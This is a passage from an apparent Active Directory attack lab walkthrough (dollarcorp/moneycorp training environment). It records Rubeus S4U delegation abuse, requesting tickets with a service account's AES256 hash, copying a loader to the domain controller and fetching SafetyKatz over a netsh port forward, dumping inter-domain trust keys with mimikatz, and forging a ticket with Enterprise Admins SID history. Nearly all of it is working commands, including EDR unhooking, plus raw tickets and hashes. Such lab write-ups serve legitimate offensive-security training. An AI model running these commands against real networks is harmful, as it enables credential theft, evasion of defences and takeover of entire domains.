      294tbm8pdZS0z5GK5t3ixnAeHvpcr3NyH26lN9f2FTW5elArqfNlwgVUFXMSfAJQzEBMQQZynDvDjsi3
      JsYoi9hSL7Jdj4vI2sw7nhTRl6OmwzWynFRJNX40ecjpRahxMV/MRQeYz3eRk8Q2QBn43B6nlt1E1Vc8
      oVLWyI2Va4UZ6fwJ5JuQ8XbBc3UHwsOmnh0nzmoCVMZG9u0god0Lj5jvPBMX8dim6duOjkbAUhOgSolf
      m2hn6UcyHe+gj9MsxG3vg0oiqVufbSfmntS3UvG30XgDXfxn5RX98qPKqenRU8iBAHKQPJW2FLa+YY7r
      ZMEre7fNcGeZoM+T3bzffU09IY2DZWWfzCUmOWAIwCzb6QORBSspapiROoExfLVCcKM+edC0azXNKEPk
      ZvOoKgSWyNR3YEEcZWCjdpyEIuBkhmtd6DBMAiVmT0ncJbHbKlvewQKZ3wwvRgw/7Yqt9k349/ZsgwYv
      yo0YNSZm04uN1GHqGxqHUh6mVGblTyTlwHIp05QgNN2flBsp14Z1A4u8uc3vu5SAwgcaoSYcAmHqOnar
      Rhu5aUT+lJr9+psHwo5XDmJWXlQ+qjH2vYrE4rh0QEuQurNIqENKA754K1KR03+ZxtK3vDBdwtt1FwCp
      CXi77kOQwdh3cId8pm6aeD+/H/T4VUdEjinlpl1kBLz+5yZ1HWz1FaJkXANn8Leec9hgXs+/mgbtoU7i
      FFjH+M4l4JwO5YLkFT1UtDcMIBTq2/MpA6hX7l8YY9+ZwGf+7krfAwDDdVtVZ34cjP7mKNCUoL5uNJNH
      S3shVysnwJsyDdxYOFkUucScOqguvA8NZGL6EgAGZu6yVdP9qsixiupdLzvjyEZtAeweeNWZoq0BL7/X
      B7TlFPKJ5ptFvzxFnN9eH0izRcfB+tiPq1bm6rT62zZS7curV1LVit3yeLe4O1hhwK+HwZuOp26ACr9e
      1TSrigV4B/aJpFERYLkuScK1Wj3AIoaN+OXsZUkNb8VJ5Q58bYfWvE4n1y1VeBRgMHUdCUXFCCpcDOp9
      p9uDOWzXYlU44QebTGulO4T9oFZY4X9tBDcsrhLV+zaMcM5FzYcemRkIbpQtXsGacrAg3Z7pwue79vZB
      H3WO99XjP9z/anUiHT2FYxs1iDU9iW1vJCD2J81qCKxwPS6f0LDvcoAH3gp7QfwfSCeuJMLrXLyG/7+i
      ILzd4rp/62t+TbZi+SCJaKiJO8JFcBuW1TLQp5so6X7TrnqvUyMdTzzI6tgS0kutbJD8itepx2XfPPIR
      mpxm00jyuVXy/gGoSKTQt4qwtUvx9yjrQ4N0prKk17POt1Dhx9up9Qg9A6ZhGkcwqkygOwBoXXid4NCf
      LLQCWykuo+YxfnpAbZtHd2Ql3izCXGM3j5RawNNQtaf4drZFUimc780EtUZiOnw1IiXvEjas5p8xDlaC
      8ZNgrozT82k1DQgvuZE4nGXROKEWN6SAruaS8aKDwo/XJYAb2M1DbpFovSayDHvYqbIt6BTIW0WVYTrS
      sq1NL6OCAQYwggECoAMCAQCigfoEgfd9gfQwgfGgge4wgeswgeigGzAZoAMCARehEgQQYVgCKIGVdhoJ
      KHG5pBfYnaEcGxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKIaMBigAwIBAaERMA8bDURDT1JQLVNU
      RDczMSSjBwMFAEDhAAClERgPMjAyNTA5MjkyMDQ4MTlaphEYDzIwMjUwOTMwMDY0ODE5WqcRGA8yMDI1
      MTAwNjIwNDgxOVqoHBsaRE9MTEFSQ09SUC5NT05FWUNPUlAuTE9DQUypLzAtoAMCAQKhJjAkGwZrcmJ0
      Z3QbGmRvbGxhcmNvcnAubW9uZXljb3JwLmxvY2Fs


[*] Action: S4U

[*] Building S4U2self request for: 'DCORP-STD731$@DOLLARCORP.MONEYCORP.LOCAL'
[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
[*] Sending S4U2self request to 172.16.2.1:88
[+] S4U2self success!
[*] Got a TGS for 'administrator' to 'DCORP-STD731$@DOLLARCORP.MONEYCORP.LOCAL'
[*] base64(ticket.kirbi):

      doIGVzCCBlOgAwIBBaEDAgEWooIFQTCCBT1hggU5MIIFNaADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlD
      T1JQLkxPQ0FMohowGKADAgEBoREwDxsNRENPUlAtU1RENzMxJKOCBPIwggTuoAMCARKhAwIBCaKCBOAE
      ggTc/JMnfpeKcOQUT+9nlTcdSBuQucp7cHm5oGxQGsVCpBboA/Hz/bjOK/n9vjJzen7sjHJrwM5sY6os
      4R/gtV0pYYOUjcjpiisk0emmkfsOx4wBy61WEQjmGJ7+ncPuOZB1037ruMEsLI/nh3szaQvpYhCS+tH8
      tC+6HCjikS8CGv+OVL6+OcTpCNVLNg9ymF/nDSSClkoixwqEAdHGuSgGolpeu3WOv2ZQ88WL3SWqwFOX
      sRhKrdIUgQfzUIqyhgl/P7BOIn7+daZn6Z6svmjWJz7mO4XUpoLKluy7DsbIqEF72asX3C7FG7kc0sWy
      +GbbiKUHJHLAbQUf72UDzf1fcXAweMdYnP9eRlEndqu/vmenFNKbVESMOmrGGJjWryBfizsb8uBtZa+p
      Hs+F3wmzbOPo6WC0SEq44aAV1VnHFjblLWL2PD7fkcko4GfIJ0X9ltC8NTaX1+U81K4W0cezBl/A5Cyp
      0M6ZxVOQaLus03JjPIYHO3u9JPTnVryZkdqKkxm9FsKrKpq3WImmqKpiKbKawi9aF3g49bBAisO89zlJ
      zl8iX5OImxrdqNF51u8X5ZLP+iXXnwJ6FxymT9MsZpNbBqi5e0m/lQJYdQo6yOm+/EnNhKkUbHPl8j9e
      VO58h9dvtY54noeJ8fFHpDAxOYe18GdZS11+JBDMaLu2mQD3doTwLOcFhivb0D1coh8EVKPcprQaBE6s
      sL6H4CU/TNdFfpdeViJzx4tVn1g+tErmjsK69eP5eD52UD9aJPwsojeHMNCK+szt7flaBCUmSV6K4bwf
      bGrCmYjpugj09w9PTjtTAhYd+jRVzH5Ykuj3lgDW3jdD5h+KPWqBOOlXhTsRN9xPQu5Rj2nLA87VqKG8
      X2QfLEQ8GqPrneQl5DfURySYN0akxzjfNsFTWa0z4PIxsK6CpvXWdEteVgO4KYGwXcE60cqLqAa2aGYc
      sRWQKyykyjf7g5wfHz+A+Rp/NlYM+ZNmdW+fMxtGscqGRU486KqneGF0t2jsB4cHS2WBfmlPMzRQGN11
      niordrKAAQCoROzBTh2h1jNOcyZo/NnVJB4XdH12uyaHLGSrCtu8yStwAvWJ47RHdm4Q/yHdvTI4z5TT
      /WIFLBjXSZDDna7oIQ9D8f7HfYlKo9qFhRzuV43H/vOEBetKBeuQ/1mylBaZ6kLpr13h+GGjjL0enyQe
      61kSiFz8HRr+OXQg8Rkaaobt4/+Q6I2pFigEF3pQhYyiF7J/2WemqzmdlOQQwtXNVec44Z0ON3xGFoDs
      ij1jMfjbIZhe5fAOG0dDbsOimrwxGQcXf9P5arz+5P5BdD2Xhxpej0OvYKFxZaH5fuOR2Fdxl42bUhvm
      Zi7bXJuFJ8d2GqCFt8dwGiriX/CY1KPZ0l5+MZuMWGyZLfY1eB8+8ti1dS4aMZwaUJpi1WM3wQQEJqG2
      L1EFA3UZLYHoUKTXzRZjPhSCbt+fs3gSYhFzP3Xaof2GxzcfdvTuHVrxzk0cgtbLdll4oTcCh58Cz1Ys
      L70WLymy1rXfvxgz5TNz30c8+tocE5HSHTodkWTxf1pITM6HXHpPZLbrQaplKx8X2jL3leoP2z6j0v6E
      b+fpyLf4GUwxoFhPL5T4OaXT2Ze/AWMP0q7jonx+fRoJsaixtfZVz5e3eaggqWujggEAMIH9oAMCAQCi
      gfUEgfJ9ge8wgeyggekwgeYwgeOgKzApoAMCARKhIgQgmcwFDIy4t2RgF7cTvdP2mkT0AK9dEBwj489l
      ddX0N0ihHBsaRE9MTEFSQ09SUC5NT05FWUNPUlAuTE9DQUyiGjAYoAMCAQqhETAPGw1hZG1pbmlzdHJh
      dG9yowcDBQBAoQAApREYDzIwMjUwOTI5MjA0ODE5WqYRGA8yMDI1MDkzMDA2NDgxOVqnERgPMjAyNTEw
      MDYyMDQ4MTlaqBwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMqRowGKADAgEBoREwDxsNRENPUlAt
      U1RENzMxJA==

[*] Impersonating user 'administrator' to target SPN 'http/dcorp-mgmt'
[*] Building S4U2proxy request for service: 'http/dcorp-mgmt'
[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
[*] Sending S4U2proxy request to domain controller 172.16.2.1:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'http/dcorp-mgmt':

      doIHBDCCBwCgAwIBBaEDAgEWooIF/DCCBfhhggX0MIIF8KADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlD
      T1JQLkxPQ0FMoh0wG6ADAgECoRQwEhsEaHR0cBsKZGNvcnAtbWdtdKOCBaowggWmoAMCARKhAwIBAaKC
      BZgEggWUv9fPd0tL2gNnOT3xPfULC5ynD1aXDfTFYJWXmhSEVws3hANnf2Cg6S3CgBFeI1KSFfv7UyDw
      +EwkOM4bUFreaF5ZddNx/sgMH5Aa7BA4GYjB5bh4k51CAifJ36zO5E/joSzOxBsqUtLJ2EdWIsh1uSj9
      k+ro3J2DbiZuTK/Iy3isHEpNsaMZtIEDGgBjjR9uo++Or3i2W1ZKP/BqvuYTzcA4+eziHT6gsfeaM9c4
      xlOswi721D1BSt+ZynIHJ/PuMsR/GT+mokMljbqJt969cF254wFWztXgZpfpH82uSGNZJDSKvTyD4UOV
      WPcKAEtxkmy35sfTjy/Y5KOVvnR+Lr2geLA4NQEaxbjjYG1R47KetonOVqTNebCnGW6gk4Y5AXRLky4y
      uQYNrmLBzTPP4kj+O5NOK2AfJqzsvxHfnC9kNfJv3PAsO8c3v/5PNu4o6vsIKD1Llva/sF4bSvUfRA9E
      eGs/8ir6E9xV5RsUNexvocH75a6cGSRcqUzlbOWHvl9FpUv2hGCtkye8FmN9R4GdFBirolLl0UhzUq4o
      Df9PMm1T0SlfR6ht5LjdEK7zsDqIYFHFjzvU4AeWb0fLfuZb69BZdmKqcCRZ38D0NLd9ytw8BuFzby+F
      lS3mAh/+38sK7KFDvfdhXM7N8yLJz5UgMrqBhVLTCh09aBLYfT74Wmmds0X21s+WMEW/zbPlQ4bwt3X9
      SuLEKtjTA6TkD42z0K5M8i8TW3sUcRKv2yyZjQNeCQhRP4in5LpJnrhO7+aoQMpiCVPmSwvtRv1Rqhp8
      GEIyXcfBar49ZlA0eZkIsxpiDkXRYPOeShQxX+YkeogD3ikQltPoNldy+lXOwxehBFqoSKm544SOHfDx
      bp7jAWrWlrC70rS8YtqlGWD6495iITHYqAZ/0KzAnaeN/PTi+CyjxooaHrgcPWcJHRe77RifOloNIl5X
      yg0sPeV/RbdVwcdlp6iCNE6y4GYn24ofOWCyGuVc3MuiumkOxwmn93xnMRUjeEUkckcwUQ0Fo7nH5m7t
      CWT2cgAhN63fXZtqnfRBvI8dEWuNEtPfScC6mNSEC8HVonJBuX6vHD1edB/DVchl+06ouds59+sfNogd
      UZbFceGLZUEASLNkBxoQyGKKoO98HxEi/mIAmjtlZmVHgc7Qjj8Mn6BviL5H6JLCZeGDfg+ybGs/+SrW
      PQZ8KokRCkyVkRSQE8p40cq31DlQiZQruiHHI/FoMXHOEC8TnNqgg+XZGOODIjC02uBEMRGvn6hTMv0S
      eyAGn6WI9fwhodmrq2l0hgNDFmp/0c3Vteu1Y3EEz7qlesW+M79KG/VMAlOpdqVQ9MnUIps0/+uKbbuD
      KtpU820xqCqFTTP6o5Gaqom8tiefylfpo+pkTFsqBgZtmfXGfF3x1fj80KB++Wk1bvQeFN35EUHusKS+
      Psu6sg7sbMJ5zhAPyXHwa2GwyTZWbw5rHm3CHKIE9ytyxQlpxTnYZoHsWff7pPHaxWYJJ0DuhjBBNmkD
      xVwTLQR0v+t0JEzZVeTufVH31v6r3iNJ7p8Fj7fkwdQ3BHjkvZVaL/Kqaqyc2/4h7lH1bfSRjYTriyuE
      YAZHJKNjzqy+cxYNKUzroGV5lfGK5X2D99Fv3D4qyJ30bTvbj03bP+deJFeyE833Zbd5HTgpCH4NeFh3
      9d+0R4T65MPzFgs/MrJJKDcWBw8OPudSGYC5XGGoddJfxWLW0HgoquEkbGvrtgvhC6FGWz+k9OLoSWMP
      jrsq7j9VDjgwt/895cQ0B4gxWGNy25hOwt9RuN8zarQIJ1fqLl+oYck8nZOuQi8wsrtvZCLfWD2n1LV5
      qlmRSBpogofcmFWEKG1xjwCbRXjXujJZLuy3PKIOONeTKitI/9RMAfwVOL21NdnpaMDuLUd7o4HzMIHw
      oAMCAQCigegEgeV9geIwgd+ggdwwgdkwgdagGzAZoAMCARGhEgQQLhkrFmmv8XQYp7hc/PsNMqEcGxpE
      T0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKIaMBigAwIBCqERMA8bDWFkbWluaXN0cmF0b3KjBwMFAECh
      AAClERgPMjAyNTA5MjkyMDQ4MTlaphEYDzIwMjUwOTMwMDY0ODE5WqcRGA8yMDI1MTAwNjIwNDgxOVqo
      HBsaRE9MTEFSQ09SUC5NT05FWUNPUlAuTE9DQUypHTAboAMCAQKhFDASGwRodHRwGwpkY29ycC1tZ210
[+] Ticket successfully imported!
```

* C:\Users\student731> winrs -r:dcorp-mgmt cmd
```
Microsoft Windows [Version 10.0.20348.2762]
(c) Microsoft Corporation. All rights reserved.
```

* C:\Users\Administrator.dcorp> whoami
```
whoami
dcorp\administrator
```

* C:\Users\Administrator.dcorp> set computername
```
set computername
COMPUTERNAME=DCORP-MGMT
```

## Learning Objective 18
```
• Using DA access to dollarcorp.moneycorp.local, escalate privileges to Enterprise Admins using 
the domain trust key. 
```

### Extract the trust key
We need the trust key for the trust between dollarcorp and moneycrop, which can be retrieved using 
Mimikatz or SafetyKatz.

Start a process with DA privileges. Run the below command from an elevated command prompt.

* C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
[+] Successfully unhooked ETW!
[+++] NTDLL.DLL IS UNHOOKED!
[+++] KERNEL32.DLL IS UNHOOKED!
[+++] KERNELBASE.DLL IS UNHOOKED!
[+++] ADVAPI32.DLL IS UNHOOKED!
[+] URL/PATH : C:\AD\Tools\Rubeus.exe Arguments : asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
[*] Action: Ask TGT

[*] Got domain: dollarcorp.moneycorp.local
[*] Showing process : True
[*] Username        : W74P51YX
[*] Domain          : TYHRERMF
[*] Password        : RW5PCL0W
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 1132
[+] LUID            : 0x2597b9

[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
[!] Pre-Authentication required!
[!]     AES256 Salt: DOLLARCORP.MONEYCORP.LOCALsvcadmin
[*] Using aes256_cts_hmac_sha1 hash: 6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011
[*] Building AS-REQ (w/ preauth) for: 'dollarcorp.moneycorp.local\svcadmin'
[*] Target LUID : 2463673
[*] Using domain controller: 172.16.2.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
[*] Target LUID: 0x2597b9
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/DOLLARCORP.MONEYCORP.LOCAL
  ServiceRealm             :  DOLLARCORP.MONEYCORP.LOCAL
  UserName                 :  svcadmin (NT_PRINCIPAL)
  UserRealm                :  DOLLARCORP.MONEYCORP.LOCAL
  StartTime                :  9/29/2025 11:50:14 AM
  EndTime                  :  9/29/2025 9:50:14 PM
  RenewTill                :  10/6/2025 11:50:14 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  1qs/BIrH08Ph94d1gbvJw2AbKQfx3Swtt4P2lWjW5aU=
  ASREP (key)              :  6366243A657A4EA04E406F1ABC27F1ADA358CCD0138EC5CA2835067719DC7011
```

### Run the below commands from the process running as DA to copy Loader.exe on dcorp-dc and use it to extract credentials

* C:\Windows\system32> echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y
```
Does \\dcorp-dc\C$\Users\Public\Loader.exe specify a file name
or directory name on the target
(F = file, D = directory)? F
C:\AD\Tools\Loader.exe
1 File(s) copied
```

* C:\Windows\system32> winrs -r:dcorp-dc cmd

* C:\Users\svcadmin> netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.31

* C:\Users\svcadmin> C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"
```
mimikatz(commandline) # lsadump::evasive-trust /patch

Current domain: DOLLARCORP.MONEYCORP.LOCAL (dcorp / S-1-5-21-719815819-3726368948-3917688648)

Domain: MONEYCORP.LOCAL (mcorp / S-1-5-21-335606122-960912869-3279953914)
 [  In ] DOLLARCORP.MONEYCORP.LOCAL -> MONEYCORP.LOCAL
    * 9/29/2025 6:16:22 AM - CLEAR   - 3d 7b 6d 8e c0 ac dd 93 41 d7 b7 08 52 9b b5 9e fe 9d eb 22 c0 dc 1c 00 a4 29 cf a0
        * aes256_hmac       f5df9e0114b22c7d407390ded7518f099df459b0f5cfa6442a002ff6ada20b08
        * aes128_hmac       5ae1bd2a9ff73bc182f346c29f510cb0
        * rc4_hmac_nt       71aec776d7fcdf15e2c88ad385d3ae56

 [ Out ] MONEYCORP.LOCAL -> DOLLARCORP.MONEYCORP.LOCAL
    * 9/29/2025 6:16:22 AM - CLEAR   - 3d 7b 6d 8e c0 ac dd 93 41 d7 b7 08 52 9b b5 9e fe 9d eb 22 c0 dc 1c 00 a4 29 cf a0
        * aes256_hmac       971bea1bd496d8a861e5e8eb9c01ad02f86f07c8b1dce9a33bce97d5304121fc
        * aes128_hmac       4b1134b67f242aa25b232be34c477156
        * rc4_hmac_nt       71aec776d7fcdf15e2c88ad385d3ae56

 [ In-1] DOLLARCORP.MONEYCORP.LOCAL -> MONEYCORP.LOCAL
    * 9/29/2025 6:01:42 AM - CLEAR   - b4 7c 78 65 11 dd 1a 2c 73 37 09 e7 99 74 df 0c 5f 36 51 ae da cc 31 d6 26 f2 eb cb
        * aes256_hmac       a1c88f2007e13ffd0738c872a8da2cf1a2f5c646ecf7250cf411efa2f4c8089c
        * aes128_hmac       77435bfd4e0f70dbf8b413d997e82831
        * rc4_hmac_nt       0de9fd50b5efab081a6dffdbdad81365

 [Out-1] MONEYCORP.LOCAL -> DOLLARCORP.MONEYCORP.LOCAL
    * 9/29/2025 6:01:42 AM - CLEAR   - b4 7c 78 65 11 dd 1a 2c 73 37 09 e7 99 74 df 0c 5f 36 51 ae da cc 31 d6 26 f2 eb cb
        * aes256_hmac       ffd707848548078e1bbfa9499482b1c52cbf1addd67e80c3ddd3bed09d86af49
        * aes128_hmac       1f54cd8cef36b8ab6b0f651e69640c4b
        * rc4_hmac_nt       0de9fd50b5efab081a6dffdbdad81365


Domain: US.DOLLARCORP.MONEYCORP.LOCAL (US / S-1-5-21-1028785420-4100948154-1806204659)
 [  In ] DOLLARCORP.MONEYCORP.LOCAL -> US.DOLLARCORP.MONEYCORP.LOCAL
    * 9/29/2025 6:16:28 AM - CLEAR   - 1c b8 bb 7c 3b 60 61 c0 18 ed 98 4e dc 5b 1d 95 d7 1a 70 bd 89 e0 6b 1f fd e5 46 aa
        * aes256_hmac       756e2b78302cfcb400ab4828451fd6c5034641dd5624879a4b79af2e75053bd6
        * aes128_hmac       fd860fd4fb33a628edb3f1abbf8641cc
        * rc4_hmac_nt       756d91067ba3e63145b0a23cb8af1b2b

 [ Out ] US.DOLLARCORP.MONEYCORP.LOCAL -> DOLLARCORP.MONEYCORP.LOCAL
    * 9/29/2025 6:16:28 AM - CLEAR   - 1c b8 bb 7c 3b 60 61 c0 18 ed 98 4e dc 5b 1d 95 d7 1a 70 bd 89 e0 6b 1f fd e5 46 aa
        * aes256_hmac       18b32ba1c1d4b5ed7d2f32bb6a82483032611c5c5d2635b4c6e3fa803f5f9480
        * aes128_hmac       84c8618a04082c830b4ba775f75ad66a
        * rc4_hmac_nt       756d91067ba3e63145b0a23cb8af1b2b

 [ In-1] DOLLARCORP.MONEYCORP.LOCAL -> US.DOLLARCORP.MONEYCORP.LOCAL
    * 9/29/2025 6:01:56 AM - CLEAR   - 2f fa 6d dc e0 04 e4 b9 eb 0c 5a 66 7b db 0a 4a fb 76 31 61 d8 8d b2 2d 7a 45 06 1b
        * aes256_hmac       c92c7306d29c455980c40ef2166f81e428c1ba5399f56faa86d1e3a6c916b80f
        * aes128_hmac       7a2ff334f3e3347b4d41e84acbdf7855
        * rc4_hmac_nt       44bbb47568e83b4fd4e8dbd3d547c427

 [Out-1] US.DOLLARCORP.MONEYCORP.LOCAL -> DOLLARCORP.MONEYCORP.LOCAL
    * 9/29/2025 6:01:56 AM - CLEAR   - 2f fa 6d dc e0 04 e4 b9 eb 0c 5a 66 7b db 0a 4a fb 76 31 61 d8 8d b2 2d 7a 45 06 1b
        * aes256_hmac       918d8d3ba3c5f32137108b68701476236d55826a06c2fa957b8fe25d118279ec
        * aes128_hmac       d20b6dbe66437dc4b7d9d1adfd6958f5
        * rc4_hmac_nt       44bbb47568e83b4fd4e8dbd3d547c427


Domain: EUROCORP.LOCAL (ecorp / S-1-5-21-3333069040-3914854601-3606488808)
 [  In ] DOLLARCORP.MONEYCORP.LOCAL -> EUROCORP.LOCAL
    * 9/29/2025 6:16:26 AM - CLEAR   - 53 8d 46 98 c8 18 29 2a 3e 8e 98 a9 ae 58 6f 48 ae 3e 69 1b 71 45 75 33 ee fe a9 a1
        * aes256_hmac       7ca2124ec30f6e3428d216b010b1000565c7da3394514e45e4cf07db2a03282b
        * aes128_hmac       021aa8b46cd27277f611face6f4faef8
        * rc4_hmac_nt       d390a1c5ea42d2cfce4058c1a128fbba

 [ Out ] EUROCORP.LOCAL -> DOLLARCORP.MONEYCORP.LOCAL
    * 9/29/2025 6:16:26 AM - CLEAR   - 53 8d 46 98 c8 18 29 2a 3e 8e 98 a9 ae 58 6f 48 ae 3e 69 1b 71 45 75 33 ee fe a9 a1
        * aes256_hmac       ba7cc062e3388afc9b39c56a9e35fb77b899abb7dd7ceb9aed9d758f3f7c490f
        * aes128_hmac       39d348732d144bec494bdec80b792db7
        * rc4_hmac_nt       d390a1c5ea42d2cfce4058c1a128fbba

 [ In-1] DOLLARCORP.MONEYCORP.LOCAL -> EUROCORP.LOCAL
    * 9/29/2025 6:01:52 AM - CLEAR   - 1e bb db 29 af 1d 95 9c 78 4c dc 2c 5b 24 e9 56 e4 ae 04 dc 5a 99 cb 45 77 aa 34 c5
        * aes256_hmac       10a0b7415471a1a1eb373a6076d0d916c155afee964d30e218871186c57b2c6c
        * aes128_hmac       786bd9d0c950fb1c3c56626ab7b2ffb4
        * rc4_hmac_nt       603518e54242753e9b77f4e7d702ff6c

 [Out-1] EUROCORP.LOCAL -> DOLLARCORP.MONEYCORP.LOCAL
    * 9/29/2025 6:01:52 AM - CLEAR   - 1e bb db 29 af 1d 95 9c 78 4c dc 2c 5b 24 e9 56 e4 ae 04 dc 5a 99 cb 45 77 aa 34 c5
        * aes256_hmac       f56429861d982209946d43adfa40405310c456010f64cccccb02b9e636245f51
        * aes128_hmac       5004628e8ae8d7e6e1503e6017f70bf8
        * rc4_hmac_nt       603518e54242753e9b77f4e7d702ff6c

mimikatz(commandline) # exit
Bye!
```

### Forge ticket - Let’s Forge a ticket with SID History of Enterprise Admins. 

* C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:71aec776d7fcdf15e2c88ad385d3ae56 /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /ldap /user:Administrator /nowrap

```
[+] Successfully unhooked ETW!
[+++] NTDLL.DLL IS UNHOOKED!
[+++] KERNEL32.DLL IS UNHOOKED!
[+++] KERNELBASE.DLL IS UNHOOKED!
[+++] ADVAPI32.DLL IS UNHOOKED!
[+] URL/PATH : C:\AD\Tools\Rubeus.exe Arguments : evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:71aec776d7fcdf15e2c88ad385d3ae56 /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /ldap /user:Administrator /nowrap
[*] Action: Build TGS

[*] Trying to query LDAP using LDAPS for user information on domain controller dcorp-dc.dollarcorp.moneycorp.local
[*] Searching path 'DC=dollarcorp,DC=moneycorp,DC=local' for '(samaccountname=Administrator)'
[*] Retrieving group and domain policy information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
[*] Searching path 'DC=dollarcorp,DC=moneycorp,DC=local' for '(|(distinguishedname=CN=Group Policy Creator Owners,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Administrators,CN=Builtin,DC=dollarcorp,DC=moneycorp,DC=local)(objectsid=S-1-5-21-719815819-3726368948-3917688648-513)(name={31B2F340-016D-11D2-945F-00C04FB984F9}))'
